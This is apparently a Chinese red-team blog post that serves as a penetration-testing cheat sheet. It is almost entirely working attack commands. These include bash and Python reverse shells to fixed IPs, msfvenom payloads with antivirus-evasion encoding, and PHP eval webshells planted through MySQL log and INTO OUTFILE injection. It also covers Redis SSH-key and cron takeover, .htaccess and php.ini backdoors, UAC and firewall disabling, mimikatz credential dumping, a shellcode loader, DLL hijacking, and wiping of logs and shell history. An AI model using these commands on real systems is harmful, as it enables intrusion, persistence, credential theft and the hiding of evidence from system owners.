---
layout: post
title: 渗透点备忘录
subtitle: 持续更新
bigimg: /img/path.jpg
tags: [Red-Team]
---

本文将日常工作学习中常用的渗透利用点记录如下:


端口信息:
查看本机3389是否开放(普通权限即可)
REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
fDenyTSConnections    REG_DWORD    0x1 为未开放
查看本机rdp监听端口(普通权限即可)
shell REG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber
开启命令(需管理员权限)
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
Meterpreter：Run post/windows/manage/enable_rdp
masscan 192.168.0.100 -p 1-10000 --rate=1000

msf内网代理转发:
meterpreter > run autoroute -s 192.168.244.0/24 //meterpreter > route flush  清除路由
run post/windows/gather/arp_scanner RHOSTS=192.168.244.0/24
background
msf exploit(handler) > use auxiliary/server/socks4a 
msf auxiliary(socks4a) > set srvhost 127.0.0.1
msf auxiliary(socks4a) > set srvport 1080
msf auxiliary(socks4a) > run
vi /etc/proxychains.conf
socks4 127.0.0.1 1080
proxychains hydra -l root -P pass.txt -f -t 20 ssh://xx.xx.xx.xx

handler
setg Proxies socks4:127.0.0.1:22222
setg ReverseAllowProxy true

系统补丁:
wmic qfe list

UAC:
注册表关闭UAC
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t reg_dword /d 0 /F
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t reg_dword /d 0 /F
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t reg_dword /d 0 /F

cs:
Ladon ip PortScan
Portscan 网段 端口 协议（icmp arp none）线程
域内存活主机:
Ladon ip段 OnlinePC
域内操作系统:
Ladon ip段 OsScan

防火墙规则:
netsh advfirewall firewall add rule name=cs dir=in action=allow protocol=TCP localport=6666
netsh advfirewall set allprofiles state off

主机发现:
netdiscover -i eth0 -r 192.168.72.0/24

phpmyadmin:
日志文件getshell
show variables like '%general%';
SET GLOBAL general_log='on'
SET GLOBAL general_log_file='C:/phpStudy/www/233.php'
SELECT '<?php eval($_POST["cmd"]);?>'

BloodHound
SharpHound.exe -c all

目录爆破:
dirb http://192.168.0.100 wordlists/common.txt -o result.txt
Dirbuster

web banner信息:
curl -I ip 

wp扫描:
wpscan http://192.168.0.100/wordpress

smb信息枚举:
enum4linux -U -o 192.168.1.200

windows获取共享资源:
net use z: \\ip\share$

linux获取共享资源:
mount -t cifs -o username='',password='' //192.168.0.100/share$ /mnt

linux主机信息:
uname -r 
lsb_release -a
cat /etc/issue

shell:
webshell反弹系统shell:(需url编码)
echo "bash -i >& /dev/tcp/10.95.14.221/1234 0>&1" | bash

提权:
配置文件、数据库连接文件、用户的文件
已知本地提权漏洞

打印图片中可打印字符:
kali strings xx.jpg >> images.txt
exiftool.exe xx.jpg

文件写入:
cat xx.txt | tee target.sh 覆盖

ssl证书解密流量:
keytool.exe -list -keystore c:\keystore 输入密钥库口令
密钥库导出证书
keytool.exe -importkeystore -srckeystore keystore -destkeystore xx.p12 -deststoretype PKCS12 -srcalias tomcat
wireshark打开pcap包并导入SSL证书

tomcat getshell:
将jsp马压缩成xx.zip后将其改名为xx.war上传
菜刀直连

主机探测:
nmap -sP IP段
nmap -sS -sV -O IP段

XSS:
" /><svg onload=alert(1)>

SSH流量转发:
vi/etc/ssh/sshd_config
AllowTcpForwarding yes  GatewayPorts yes  TCPKeepAlive yes  PasswordAuthentication yes

win主机信息收集
密码收集:
主机本地存储密码 lazagne.exe all
补丁信息:
msf run post/windows/gather/enum_patches
软件信息:
msf run post/windows/gather/enum_applications
网段探测:
msf run post/windows/gather/arp_scanner RHOSTS=XX.XX.XX.0/24
主机所在域:
msf mimikatz_command -f system::computer
msf mimikatz_command -f samdump::hashes

SMTP服务器中转:
telnet ip 25
HELO hello
mail from:<xx@xx.com>
rcpt to:<yy@yy.com>
data
from:display@cc.com
to:yy@yy.com
subject:test
test
.
quit

DKIM邮件签名:
邮件源文件DKIM头中s字段为selector的值
DKIM服务器域名 selector._domainkey.xxx.com
查找公开密钥 nslookup -type=txt s1024._domainkey.aliyun.com

DMARC电子邮件认证协议:
通常情况下，它与SPF或DKIM结合使用，并告知收件方服务器当未通过SPF或 DKIM检测时该如何处理
nslookup -type=txt _dmarc.aliyun.com
none	不采取特定措施
quarantine	邮件接收者将DMARC验证失败的邮件标记为可疑的。
reject	域名所有者希望邮件接收者将DMARC验证失败的邮件拒绝
pct=：域名所有者邮件流中应用DMARC策略的消息百分比。
rua=：用于接收消息反馈的邮箱。 

redis getshell:
1.通过写SSH key的方式进行getshell 
生成密钥对
ssh-keygen -t rsa
将生成的公钥写入到文件中
(echo -e "\n\n\n"; cat id_rsa.pub; echo -e "\n\n\n") > pub.txt
设置路径、文件、写入公钥 
config set dir /root/.ssh/
config set dbfilename "authorized_keys"
save
exit
连接
ssh -i id_rsa root@192.168.2.155
2.通过写SSH key的方式进行getshell 
生成密钥对
ssh-keygen -t rsa
将生成的公钥写入到文件中
(echo -e "\n\n\n"; cat id_rsa.pub; echo -e "\n\n\n") > pub.txt
设置路径、文件、写入公钥 
config set dir /root/.ssh/
config set dbfilename "authorized_keys"
save
exit
连接
ssh -i id_rsa root@192.168.2.155
3.redis写定时任务反弹shell
config set dir /var/spool/cron/
config set dbfilename root
set x "\n* * * * * bash -i >& /dev/tcp/192.168.2.155/2333 0>&1\n"
save

代理转发:
HTTP Service reGeorgSocksProxy.py
SSH隧道:
ssh -qTCfnN -L 本地端口:127.0.0.1:远程端口 user@host #本地转发
ssh -qTCfnN -R 远程端口:127.0.0.1:本地端口 user@host #远程转发
ssh -qTCfnN -D 本地端口 user@host #动态转发

C2通信:
https://github.com/threatexpress/cs2modrewrite
https://github.com/rsmudge/Malleable-C2-Profiles

痕迹清理:
Elsave可用于远程清除Windows日志文件，也可以备份远程日志文件。
Clearlog.exe
脚本工具停止系统日志记录
https://github.com/3gstudent/Windows-EventLog-Bypass
https://github.com/hlldz/Invoke-Phant0m

敏感文件路径:
Windows：
   C:\boot.ini  //查看系统版本
   C:\Windows\System32\inetsrv\MetaBase.xml  //IIS配置文件
   C:\Windows\repair\sam  //存储系统初次安装的密码
   C:\Program Files\mysql\my.ini  //Mysql配置
   C:\Program Files\mysql\data\mysql\user.MYD  //Mysql root
   C:\Windows\php.ini  //php配置信息
   C:\Windows\my.ini  //Mysql配置信息

Linux：
   /root/.ssh/authorized_keys
   /root/.ssh/id_rsa
   /root/.ssh/id_ras.keystore
   /root/.ssh/known_hosts
   /etc/passwd
   /etc/shadow
   /etc/my.cnf
   /etc/httpd/conf/httpd.conf
   /root/.bash_history
   /root/.mysql_history
   /proc/self/fd/fd[0-9]*(文件标识符)
   /proc/mounts
   /porc/config.gz

msfvenom:
msfvenom -p payload --list-options
msfvenom --list payloads
msfvenom --list encoders
msfvenom --list nops
msfvenom --list platforms
msfvenom --list archs
msfvenom --list encrypt
msfvenom --list formats

msf exploit(multi/handler) > set ExitOnSession false   //可以在接收到seesion后继续监听端口，保持侦听。
msf5 exploit(multi/handler) > set SessionCommunicationTimeout 0  //默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0
msf5 exploit(multi/handler) > set SessionExpirationTimeout 0 //默认情况下，一个星期（604800秒）后，会话将被强制关闭,修改为0可永久不会被关闭
msf exploit(multi/handler) > exploit -j -z //-j为后台任务，-z为持续监听
msf5 > handler -H 10.211.55.2 -P 3333 -p windows/meterpreter/reverse_tcp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e x86/shikata_ga_nai -b "\x00" -i 5 -a x86 --platform win PrependMigrate=true PrependMigrateProc=svchost.exe -f exe -o  shell.exe  //生成的shell程序执行后会启动两个进程shell.exe和svchost.exe，关闭其中一个不会影响会话状态。唯一美中不足的是svchost.exe不是system32目录下的。

绕过杀软:
msfvenom -p windows/meterpreter/reverse_https lhost=10.211.55.2 lport=3333 -f c
msf exploit(multi/handler) > set EnableStageEncoding true   //尝试使用不同的编码器对stage进行编码，可能绕过部分杀软的查杀
EnableStageEncoding => true
msf exploit(multi/handler) > set stageencoder x86/fnstenv_mov
Stageencoder => x64/xor
msf exploit(multi/handler) > set stageencodingfallback false
stageencodingfallback => false

msfvenom -p  windows/meterpreter/reverse_tcp_rc4  lhost=10.211.55.2 lport=3333 RC4PASSWORD=password  -f c
在监听的服务端设置相同的密钥

各平台payload
windows:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Windows -f exe > shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f exe > shell.exe

linux:
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Linux -f elf > shell.elf

mac:
msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform osx -f macho > shell.macho

android:
msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw > shell.apk
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 R > test.apk

powershell:
msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e cmd/powershell_base64 -i 3 -f raw -o shell.ps1

nc:
msfvenom -p windows/shell_hidden_bind_tcp LHOST=10.211.55.2 LPORT=3333  -f exe> 1.exe
msfvenom -p windows/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333  -f exe> 1.exe

shellcode
Linux Shellcode:
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Linux -f c
Windows Shellcode:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Windows -f c
Mac Shellcode:
msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform osx -f c

脚本:
python reverse shell:
msfvenom -p cmd/unix/reverse_python LHOST=10.211.55.2 LPORT=3333 -f raw > shell.py
msfvenom -a python -p python/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw > shell.py

python bind shell:
python/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.211.55.2",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
python/python3 -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(("10.211.55.2",3333))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"

bash:
msfvenom -p cmd/unix/reverse_bash LHOST=10.211.55.2 LPORT=3333 -f raw > shell.sh

perl:
msfvenom -p cmd/unix/reverse_perl LHOST=10.211.55.2 LPORT=3333 -f raw > shell.pl

lua:
msfvenom -p cmd/unix/reverse_lua LHOST=10.211.55.2 LPORT=3333 -f raw -o shell.lua

ruby:
msfvenom -p ruby/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw -o shell.rb

WEB
PHP:
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

ASPX:
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f aspx -o shell.aspx

ASP:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f asp > shell.asp

JSP:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw > shell.jsp

WAR:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f war > shell.war

nodejs:
msfvenom -p nodejs/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw -o shell.js


Handlers:
use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST 10.211.55.2
set LPORT 3333
set ExitOnSession false
exploit -j -z

dll劫持:
process monitor监控exe调用的dll
通过CFF Explorer查看导入的dll列表
选择其中的dll查看其包含的函数
编写dll
1.
extern "C"
{
    _declspec(dllexport) void funcname();
}
2.
_declspec(dllexport) void funcname()
{
    WinExec("evil.exe",SW_SHOW);
}
添加xx.def文件
LIBRARY
EXPORTS
funcname
在链接器 输入 模块定义文件 添加xx.def
代码生成 MT
编译dll

ssh密钥解密:
ssh2john.py id_rsa > ssh.txt
john ssh.txt --wordlist=../../wordlists/rockyou.txt

hashcat:
linux hash david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ hashcat -m 500 -a 0 hash.txt ./wordlists/rockyou.txt

docker login https://xx.xx.xx
安装证书ca.crt

curl --user admin:admin https://xx.xx.xx/_catalog
{“repositories”:[“bolt-image”]}
docker image pull docker.registry.htb/bolt-image
docker image ls
docker run -it docker.registry.htb/bolt-image /bin/bash
docker ps -alq
docker cp f7f8fc1f7f17:/root/.ssh/id_rsa .

web后门:
1.fastcgi运行php 配置.user.ini 插入auto_prepend_file=evil.txt 访问当前目录下所有php文件时自动包含evil.txt文件
2..htaccess
站长经常用.htaccess做伪静态，我们也可以拿来做后门。
自定义.htaccess上传，下面是内容
<FileMatch "aaa">
SetHandler application/x-httpd-php
</FileMatch>
同目录下，上传一个名称包含aaa的文件，就可以把此文件当成php解析。
3.php.ini
修改php.ini，添加如下内容：
allow_url_include=On
auto_prepend_file="data:;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW2NtZF0pOz8+"
重启php后，访问任意php页面都可以自动包含上述webshell，即解码后的
<?php @eval($_REQUEST[cmd]);?>
4.php环境变量include_path目录中创建evil.txt 在网站根目录上传php文件<?php include('evil.txt');?>
5.aspx
C:\Windows\Microsoft.NET\Framework\v2.0.50727\aspnet_compiler.exe -v / -p c:\Users\Jumbo\Desktop\aspxceshi\webshell\ c:\Users\Jumbo\Desktop\aspxceshi\webshellbin\
在webshellbin目录生成dll文件
复制compiled文件中assembly值和type值
修改web.config
<system.web>
    <httpHandlers>
        <add verb="*" path="*" type="assembly值, type值" validate="True"/>
    </httpHandlers>
</system.web>
将生成的dll放入网站bin目录
任意地址均为webshell

mysql写入webshell
1.union select
?id=1 union select 1,"<?php @eval($_POST['g']);?>",3 into outfile 'E:/study/WWW/evil.php'
?id=1 union select 1,0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22,3 into outfile "E:/study/WWW/evil.php"
2.利用分隔符写入
?id=1 LIMIT 0,1 INTO OUTFILE 'E:/study/WWW/evil.php' lines terminated by 0x20273c3f70687020406576616c28245f504f53545b2767275d293b3f3e27 --
?id=1 INTO OUTFILE '物理路径' lines terminated by  （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' fields terminated by （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' columns terminated by （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' lines starting by    （一句话hex编码）#
3.利用log写入
show variables like '%general%';             #查看配置
set global general_log = on;                 #开启general log模式
set global general_log_file = 'E:/study/WWW/evil.php'; #设置日志目录为shell地址
select '<?php eval($_GET[g]);?>'             #写入shell
set global general_log=off;                  #关闭general log模式

curl --socks5-hostname 127.0.0.1:1080 www.google.com
wget 只能使用 http 代理，而无法直接使用 socks 代理
1.proxychains wget www.google.com
2.apt-get install tsocks
cat /etc/tsocks.conf
server = 127.0.0.1
# Server type defaults to 4 so we need to specify it as 5 for this one
server_type = 5
# The port defaults to 1080 but I've stated it here for clarity 
server_port = 1080
tsocks wget www.google.com

shellcode加载方式
#include <iostream>
#include "stdio.h"
#include "Windows.h"
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"") //去除窗口
unsigned char shellcode[] =
1.LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(Memory, shellcode, sizeof(shellcode));
((void(*)())Memory)();

mysql远程登录关闭 上传ntunnel php文件创建http隧道

dns-zone-transfer
nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=xxx.edu.cn -p 53 -Pn dns.xxx.edu.cn

32位机器:
32位的程序存储在C:\Program Files中，32位的dll存储在C:\System32
64位机器:
64位的程序存储在C:\Program Files中，64位的dll存储在C:\Windows\System32
32位的程序存储在C:\Program Files(x86)中，32位的dll存储在C:\Windows\SysWOW64

last显示/var/log/wtmp文件
lastb显示/var/log/btmp文件(需root权限)
配置文件vim /etc/logrotate.conf
清除登录记录(注意wtmp.1 btmp.1等历史文件)
echo ""> /var/log/wtmp
echo ""> /var/log/btmp

history:
history -c 清除所有历史记录
vim ~/.bash_history 修改历史记录存储文件
history -r 读取历史文件到内存

环境变量
shell c:\windows\system32\setx PATH "%path%;C:\WINDOWS\System32\"

procdump+mimikatz
mimikatz "sekurlsa::minidump 1.dmp" "sekurlsa::logonPasswords full" exit

mysql命令行执行sql语句
mysql -uroot -pxxx mysql -e "select sys_eval('whoami');" 
123=system("mysql -uroot -pHfhtXd mysql -e \"select sys_eval('cat /etc/shadow');\" ");

cat /proc/bus/input/devices

/etc/profile 每个用户登录执行一次
~/.bash_profile 当前用户登录执行一次
/etc/bash.bashrc 每个用户打开shell就执行
~/.bashrc 当前用户打开shell就执行
~/.bash_logout 当前用户退出登录时执行

